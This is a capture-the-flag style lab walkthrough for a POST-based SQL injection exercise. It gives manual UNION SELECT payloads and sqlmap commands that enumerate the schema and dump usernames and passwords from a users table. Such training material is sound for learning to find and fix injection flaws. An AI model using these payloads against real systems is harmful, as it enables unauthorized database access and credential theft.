-> POST Based SQL Injection Variant 2

Query: 
	Manual Method:
		Step 1: Go to the URL to access the lab (The URL may be different for each user). http://13.233.238.136/SQL-Injection/Post-Based-SQL-Injection-Variant-2/
		
		Step 2: Now enter the given credentials (Username: test2@test.com; Password: pass).
		
		Step 3: Open Burp Suite, and turn on the intercept.
		
		Step 4: Now choose any city and click on the ‘search’ icon to intercept the request, and send this request to repeater(ctrl+r)
		
		Step 5: The request will look like this:

			POST /SQL-Injection/Post-Based-SQL-Injection-Variant-2/details.php HTTP/1.1

			city=Delhi

			Step 6: Now add this query to the City=Delhi parameter:
			city=Delhi' order by 7--+
			Click on Go.
			Right click under the ‘Response’ section and choose ‘show response to browser’ option to view the response.
			
			Step 7: Now to find vulnerable columns enter this query:
			city=Delhi' union select 1,2,3,4,5,6,7--+
			It will give you three columns (2,5,6) and these are our injection points.
			
			Step 8: Now to find tables, enter this query:
			city=Delhi' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.table_constraints--+
			Then click on Go and then again click on ‘show response in browser’.
			
			Step 9: Now finding the database, enter this query:
			city=Delhi' union select 1,database(),3,4,5,6,7--+
			
			Step 10: Now finding table name in that database:
			city=Delhi' UNION SELECT 1,group_concat(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema="SQL_Injection_V7"--+

			Step 11: Now we will find column name in that specific table: 
			city=Delhi' UNION SELECT 1,group_concat(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_schema="SQL_Injection_V7" AND table_name="users"--+
			
			Step 12: Now we will data in our column of specified row: 
			city=Delhi' UNION SELECT 1,group_concat(id, username, password),3,4,5,6,7 FROM users--+
			
	SQLMap:
		Step 1: Open Burp Suite and intercept the request as you have done previously in the manual approach.
		
		Step 2: Add * to the query:
		city=Delhi*
		
		Step 3: Now copy the request and save it in a notepad file in the SQLmap directory by the name anyname.txt
		
		Step 4: Open SQLmap in the terminal or command prompt.
		
		Step 5: Now enter this command:
		sqlmap -r filename.txt --dbs
		
		Step 6: It will ask you for several options to choose from, accordingly and learn about SQLmap.
		If you do not understand which option to choose in any condition, you may simply press Enter.
		
		Step 7: Once this is done, enter this command to find tables:
		sqlmap -r checksql.txt -D SQL_Injection_V7 --tables

		Step 8: To fetch columns enter this command:
		sqlmap -r checksql.txt -D SQL_Injection_V7 -T users --columns
		
		Step 9: Now to fetch data, enter this command:
		sqlmap -r checksql.txt -D SQL_Injection_V7 -T users -C id,password,username --dump
